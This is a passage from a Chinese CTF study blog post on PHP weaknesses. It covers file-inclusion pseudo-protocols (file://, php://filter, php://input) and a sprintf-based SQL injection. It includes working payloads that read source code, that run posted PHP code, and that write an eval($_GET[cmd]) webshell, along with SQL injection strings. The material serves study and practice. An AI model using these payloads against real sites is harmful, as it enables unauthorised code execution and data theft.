+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</span><br></pre></td></tr></table></figure>
+
+<p>[文件的相对路径和文件名]</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=./phpinfo.txt</span><br></pre></td></tr></table></figure>
+
+<p>[http：&#x2F;&#x2F;网络路径和文件名]</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="php-协议"><a href="#php-协议" class="headerlink" title="php:// 协议"></a><code>php://</code> 协议</h3><h4 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h4><p><code>php://</code> 访问各个输入&#x2F;输出流（I&#x2F;O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于<strong>读取源码</strong>，<code>php://input</code>用于<strong>执行PHP代码</strong>。</p>
+<h4 id="说明-1"><a href="#说明-1" class="headerlink" title="说明"></a>说明</h4><p>PHP 提供了一些杂项输入&#x2F;输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，<br>内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>
+<table>
+<thead>
+<tr>
+<th>协议</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>php:&#x2F;&#x2F;input</td>
+<td>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input </code>是无效的。</td>
+</tr>
+<tr>
+<td>php:&#x2F;&#x2F;output</td>
+<td>只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td>
+</tr>
+<tr>
+<td>php:&#x2F;&#x2F;fd</td>
+<td>(&gt;&#x3D;5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</td>
+</tr>
+<tr>
+<td>php:&#x2F;&#x2F;memory php:&#x2F;&#x2F;temp</td>
+<td>(&gt;&#x3D;5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</td>
+</tr>
+<tr>
+<td>php:&#x2F;&#x2F;filter</td>
+<td>(&gt;&#x3D;5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</td>
+</tr>
+</tbody></table>
+<h4 id="php-filter参数详解"><a href="#php-filter参数详解" class="headerlink" title="php:&#x2F;&#x2F;filter参数详解"></a><strong>php:&#x2F;&#x2F;filter参数详解</strong></h4><p>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：</p>
+<table>
+<thead>
+<tr>
+<th>php:&#x2F;&#x2F;filter 参数</th>
+<th>描述</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>resource&#x3D;&lt;要过滤的数据流&gt;</td>
+<td>必须项。它指定了你要筛选过滤的数据流。</td>
+<td></td>
+</tr>
+<tr>
+<td>read&#x3D;&lt;读链的过滤器&gt;</td>
+<td>可选项。可以设定一个或多个过滤器名称，以管道符（*\</td>
+<td>*）分隔。</td>
+</tr>
+<tr>
+<td>write&#x3D;&lt;写链的过滤器&gt;</td>
+<td>可选项。可以设定一个或多个过滤器名称，以管道符（\</td>
+<td>）分隔。</td>
+</tr>
+<tr>
+<td>&lt;; 两个链的过滤器&gt;</td>
+<td>任何没有以 <em>read&#x3D;</em> 或 <em>write&#x3D;</em> 作前缀的筛选器列表会视情况应用于读或写链。</td>
+<td></td>
+</tr>
+</tbody></table>
+<p><strong>可用的过滤器列表（4类）</strong></p>
+<p>此处列举主要的过滤器类型，详细内容请参考：<a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=JUbyYTPOsF4A4clTh8+Ucw==.bmd+jJ/CXmr1OIZuUQyjUpvVYDo6L3EyjnpUnsTKhJ4n4duNSOviaKjQ/kRQxQUU">https://www.php.net/manual/zh/filters.php</a></p>
+<table>
+<thead>
+<tr>
+<th>字符串过滤器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>string.rot13</td>
+<td>等同于<code>str_rot13()</code>，rot13变换</td>
+</tr>
+<tr>
+<td>string.toupper</td>
+<td>等同于<code>strtoupper()</code>，转大写字母</td>
+</tr>
+<tr>
+<td>string.tolower</td>
+<td>等同于<code>strtolower()</code>，转小写字母</td>
+</tr>
+<tr>
+<td>string.strip_tags</td>
+<td>等同于<code>strip_tags()</code>，去除html、PHP语言标签</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>转换过滤器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>convert.base64-encode &amp; convert.base64-decode</td>
+<td>等同于<code>base64_encode()</code>和<code>base64_decode()</code>，base64编码解码</td>
+</tr>
+<tr>
+<td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td>
+<td>quoted-printable 字符串与 8-bit 字符串编码解码</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>压缩过滤器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>zlib.deflate &amp; zlib.inflate</td>
+<td>在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td>
+</tr>
+<tr>
+<td>bzip2.compress &amp; bzip2.decompress</td>
+<td>同上，在本地文件系统中创建 bz2 兼容文件的方法。</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>加密过滤器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>mcrypt.*</td>
+<td>libmcrypt 对称加密算法</td>
+</tr>
+<tr>
+<td>mdecrypt.*</td>
+<td>libmcrypt 对称解密算法</td>
+</tr>
+</tbody></table>
+<h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><p><code>php://filter/read=convert.base64-encode/resource=[文件名]</code>读取文件源码（针对php文件需要base64编码）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</span><br></pre></td></tr></table></figure>
+
+<p><code>php://input + [POST DATA]</code>执行php代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://input</span><br><span class="line">[POST DATA部分]</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>若有写入权限，写入一句话木马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://input</span><br><span class="line">[POST DATA部分]</span><br><span class="line">&lt;?php fputs(fopen(&#x27;1juhua.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="sprintf函数漏洞"><a href="#sprintf函数漏洞" class="headerlink" title="sprintf函数漏洞"></a>sprintf函数漏洞</h2><h3 id="函数作用"><a href="#函数作用" class="headerlink" title="函数作用"></a>函数作用</h3><p>1，sprintf(),函数是php中的函数</p>
+<p>2，作用是将格式化<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a>写入变量中</p>
+<p>3，函数形式为sprintf(format,arg1,arg2,arg++)</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>format</td>
+<td>必需。规定字符串以及如何格式化其中的变量。<br/>可能的格式值：<br/>%% - 返回一个百分号 %<br/>%b - 二进制数<br/>%c - ASCII 值对应的字符<br/>%d - 包含正负号的十进制数（负数、0、正数）<br/>%e - 使用小写的科学计数法（例如 1.2e+2）<br/>%E - 使用大写的科学计数法（例如 1.2E+2）<br/>%u - 不包含正负号的十进制数（大于等于 0）<br/>%f - 浮点数（本地设置）<br/>%F - 浮点数（非本地设置）<br/>%g - 较短的 %e 和 %f<br/>%G - 较短的 %E 和 %f<br/>%o - 八进制数<br/>%s - 字符串<br/>%x - 十六进制数（小写字母）<br/>%X - 十六进制数（大写字母）<br/>附加的格式值。必需放置在 % 和字母之间（例如 %.2f）：<br/>+ （在数字前面加上 + 或 - 来定义数字的正负性。默认情况下，只有负数才做标记，正数不做标记）<br/>‘ （规定使用什么作为填充，默认是空格。它必须与宽度指定器一起使用。例如：%’x20s（使用 “x” 作为填充））<br/>- （左调整变量值）<br/>[0-9] （规定变量值的最小宽度）<br/>.[0-9] （规定小数位数或最大字符串长度）<br/>注释：如果使用多个上述的格式值，它们必须按照以上顺序使用。</td>
+</tr>
+<tr>
+<td>arg1</td>
+<td>必需。规定插到 <em>format</em> 字符串中第一个 % 符号处的参数。</td>
+</tr>
+<tr>
+<td>arg2</td>
+<td>可选。规定插到 <em>format</em> 字符串中第二个 % 符号处的参数。</td>
+</tr>
+<tr>
+<td>arg++</td>
+<td>可选。规定插到 <em>format</em> 字符串中第三、四等 % 符号处的参数</td>
+</tr>
+</tbody></table>
+<p>*<strong>*若%符号多于arg参数，则需要占位符，占位符格式为“<code>%number\$</code>” 其中number表示该项与第几个arg匹配，如若与第一个匹配，则占位符为“<code>%1\$</code>”</strong></p>
+<h3 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h3><p>通过底层实现代码可以发现，sprintf（）方法就是对15种类型做了匹配，15种类型以外的就直接break了没有做任何处理，所以就会导致一个问题：</p>
+<p>如果我们输入”%&quot;或者”%1$&quot;,他会把反斜杠当做格式化字符的类型，然而找不到匹配的项那么”%&quot;,”%1$&quot;就因为没有经过任何处理而被替换为空。</p>
+<p>因此sprintf注入的原理就是：</p>
+<p>我们用一个15种类型之外的”&quot; 来代替格式字符类型让函数替换为空，则“%1$&#39;”后面的单引号就能闭合前面的单引号，以下是一些例子帮助我们更好的理解</p>
+<p>不带占位符的：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from user where username=&#x27;%\&#x27; and 1=1 #&#x27;;&quot;</span>;</span><br><span class="line"><span class="variable">$user</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">sprintf</span>(<span class="variable">$sql</span>,<span class="variable">$user</span>);</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username=&#x27;&#x27; and 1=1 #&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>带有占位符：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//addslashes()函数：在预定义前面加反斜杠，预定义符有单引号（&#x27;），双引号（&quot;），反斜杠（\），NULL</span></span><br><span class="line"><span class="variable">$input</span> = <span class="title function_ invoke__">addslashes</span> (<span class="string">&quot;%1$&#x27; and 1=1#&quot;</span> );</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">sprintf</span> (<span class="string">&quot;AND b=&#x27;%s&#x27;&quot;</span>, <span class="variable">$input</span> );</span><br><span class="line"><span class="variable">$sql</span> = <span class="title function_ invoke__">sprintf</span> (<span class="string">&quot;SELECT * FROM t WHERE a=&#x27;%s&#x27; <span class="subst">$b</span> &quot;</span>, <span class="string">&#x27;admin&#x27;</span> );</span><br><span class="line"><span class="comment">//对$input与$b进行了拼接</span></span><br><span class="line"><span class="comment">//$sql = sprintf (&quot;SELECT * FROM t WHERE a=&#x27;%s&#x27; AND b=&#x27;%1$\&#x27; and 1=1#&#x27; &quot;, &#x27;admin&#x27; );</span></span><br><span class="line"><span class="comment">//很明显，这个句子里面的\是由addsashes为了转义单引号而加上的，使用%s与%1$\类匹配admin，那么admin只会出现在%s里，%1$\为空</span></span><br><span class="line"><span class="keyword">echo</span>  <span class="variable">$sql</span> ;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM t WHERE a=&#x27;admin&#x27; AND b=&#x27;&#x27; and 1=1#&#x27;</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Neo</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/10/24/PHP%E7%89%B9%E6%80%A7/">http://example.com/2024/10/24/PHP%E7%89%B9%E6%80%A7/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">Hexo</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web/">Web</a><a class="post-meta__tags" href="/tags/PHP/">PHP</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2024/10/24/MISC/" title="MISC"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">MISC</div></div><div class="info-2"><div class="info-item-1">图片隐写基于LSB原理的图片隐写Stegsolvezsteg（KALI）Kali Linux 中则自带了RubyGems。 然后用以下命令安装zsteg后即可使用： 1gem install zsteg  参数 123456789--bits 1：每次只摘取颜色通道中的第 1 个比特。--channel r：只摘取红色通道的比特位。--lsb：按最低有效位优先的顺序进行摘取。--order xy：按照从左至右、从上至下的顺序对图像素点进行摘取。--limit 2048：最多摘取输出 2048 字节。  一把梭 1zsteg 图片 --all | grep flag  盲水印</div></div></div></a><a class="pagination-related" href="/2024/10/24/sql%E6%B3%A8%E5%85%A5/" title="SQL注入"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">SQL注入</div></div><div class="info-2"><div class="info-item-1">常用字段1234567group_concat() #--concat() #--table_schema #--information_schema.tables #--information_schema.columns #--table_name #--column_name #--    普通注入需要根据实际考虑是否需要闭合单引号或双引号 基础注入万能密码 1or 1=1 #--  基础注入实例 123456or 1=1 union/ select 1,concat(table_name),3 from information_schema.tables where table_schema=database()#--#获取表明or 1=1 union select 1,concat(column_name),3 from information_schema.columns where table_schema=database() AND table_name=&#x27;flag&#x27;#--#获取列名or 1=1 union select...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2024/10/24/sql%E6%B3%A8%E5%85%A5/" title="SQL注入"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-24</div><div class="info-item-2">SQL注入</div></div><div class="info-2"><div class="info-item-1">常用字段1234567group_concat() #--concat() #--table_schema #--information_schema.tables #--information_schema.columns #--table_name #--column_name #--    普通注入需要根据实际考虑是否需要闭合单引号或双引号 基础注入万能密码 1or 1=1 #--  基础注入实例 123456or 1=1 union/ select 1,concat(table_name),3 from information_schema.tables where table_schema=database()#--#获取表明or 1=1 union select 1,concat(column_name),3 from information_schema.columns where table_schema=database() AND table_name=&#x27;flag&#x27;#--#获取列名or 1=1 union select...</div></div></div></a><a class="pagination-related" href="/2024/10/24/%E8%8F%9C%E9%B8%9F%E6%9D%AFweb/" title="菜鸟杯-Web"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-24</div><div class="info-item-2">菜鸟杯-Web</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Neo</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.</span> <span class="toc-text">命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.</span> <span class="toc-text">常用函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%85%E8%83%BD%E4%BD%BF%E7%94%A8p"><span class="toc-number">1.2.</span> <span class="toc-text">仅能使用p &#96; ? &#x2F; + &lt; &gt; &#x3D;</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%95%BF%E7%9F%AD%E6%A0%87%E7%AD%BE"><span class="toc-number">1.2.1.</span> <span class="toc-text">长短标签</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BC%95%E5%8F%B7-%EF%BC%88%E9%94%AE%E7%9B%98Tab%E9%94%AE%E4%B8%8A%E9%9D%A2%E9%82%A3%E4%B8%AA%E9%94%AE%EF%BC%89"><span class="toc-number">1.2.2.</span> <span class="toc-text">反引号&#96;&#96;（键盘Tab键上面那个键）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%82%B9"><span class="toc-number">1.2.3.</span> <span class="toc-text">点 .</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A0%E5%8F%B7"><span class="toc-number">1.2.4.</span> <span class="toc-text">加号 +</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#p-p-p"><span class="toc-number">1.2.5.</span> <span class="toc-text">&#x2F;??p&#x2F;p?p??????</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%A4%B9%E7%9B%AE%E5%BD%95"><span class="toc-number">1.2.5.1.</span> <span class="toc-text">临时文件夹目录</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%91%BD%E5%90%8D%E8%A7%84%E5%88%99"><span class="toc-number">1.2.5.2.</span> <span class="toc-text">临时文件命名规则</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6"><span class="toc-number">1.2.5.3.</span> <span class="toc-text">通配符</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8burpsuite%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.6.</span> <span class="toc-text">使用burpsuite上传文件</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Content-Type"><span class="toc-number">1.2.6.1.</span> <span class="toc-text">Content-Type</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#boundary"><span class="toc-number">1.2.6.2.</span> <span class="toc-text">boundary</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9"><span class="toc-number">1.2.6.3.</span> <span class="toc-text">文件内容</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%80%E7%BB%88payload"><span class="toc-number">1.2.7.</span> <span class="toc-text">最终payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MD5%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">MD5绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MD5%E7%9B%B8%E7%AD%89%E7%BB%95%E8%BF%87"><span class="toc-number">2.1.</span> <span class="toc-text">MD5相等绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">2.1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MD5%E5%80%BC%E4%BB%A50E%E5%BC%80%E5%A4%B4%E7%9A%84%E6%95%B0%E6%8D%AE"><span class="toc-number">2.1.2.</span> <span class="toc-text">MD5值以0E开头的数据</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MD5%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.</span> <span class="toc-text">MD5数组绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B"><span class="toc-number">2.2.2.</span> <span class="toc-text">实例</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BB%93%E5%90%88"><span class="toc-number">3.</span> <span class="toc-text">与数据库结合</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#password-md5-pass-true-%E7%BB%95%E8%BF%87"><span class="toc-number">3.1.</span> <span class="toc-text">$password&#x3D;md5($pass,true)绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="toc-number">3.1.1.</span> <span class="toc-text">万能密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-number">3.1.2.</span> <span class="toc-text">原理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">4.</span> <span class="toc-text">PHP伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#file-%E5%8D%8F%E8%AE%AE"><span class="toc-number">4.1.</span> <span class="toc-text">file:&#x2F;&#x2F; 协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%9C%E7%94%A8"><span class="toc-number">4.1.1.</span> <span class="toc-text">作用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%B4%E6%98%8E"><span class="toc-number">4.1.2.</span> <span class="toc-text">说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-number">4.1.3.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-%E5%8D%8F%E8%AE%AE"><span class="toc-number">4.2.</span> <span class="toc-text">php:&#x2F;&#x2F; 协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%9C%E7%94%A8-1"><span class="toc-number">4.2.1.</span> <span class="toc-text">作用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%B4%E6%98%8E-1"><span class="toc-number">4.2.2.</span> <span class="toc-text">说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php-filter%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3"><span class="toc-number">4.2.3.</span> <span class="toc-text">php:&#x2F;&#x2F;filter参数详解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-1"><span class="toc-number">4.2.4.</span> <span class="toc-text">示例</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sprintf%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E"><span class="toc-number">5.</span> <span class="toc-text">sprintf函数漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E4%BD%9C%E7%94%A8"><span class="toc-number">5.1.</span> <span class="toc-text">函数作用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">5.2.</span> <span class="toc-text">注入原理</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/24/MISC/" title="MISC">MISC</a><time datetime="2024-10-23T16:00:00.000Z" title="发表于 2024-10-24 00:00:00">2024-10-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/24/PHP%E7%89%B9%E6%80%A7/" title="PHP特性">PHP特性</a><time datetime="2024-10-23T16:00:00.000Z" title="发表于 2024-10-24 00:00:00">2024-10-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/24/sql%E6%B3%A8%E5%85%A5/" title="SQL注入">SQL注入</a><time datetime="2024-10-23T16:00:00.000Z" title="发表于 2024-10-24 00:00:00">2024-10-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/24/%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4/" title="常用指令">常用指令</a><time datetime="2024-10-23T16:00:00.000Z" title="发表于 2024-10-24 00:00:00">2024-10-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/24/%E8%8F%9C%E9%B8%9F%E6%9D%AFweb/" title="菜鸟杯-Web">菜鸟杯-Web</a><time datetime="2024-10-23T16:00:00.000Z" title="发表于 2024-10-24 00:00:00">2024-10-24</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2024 By Neo</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax 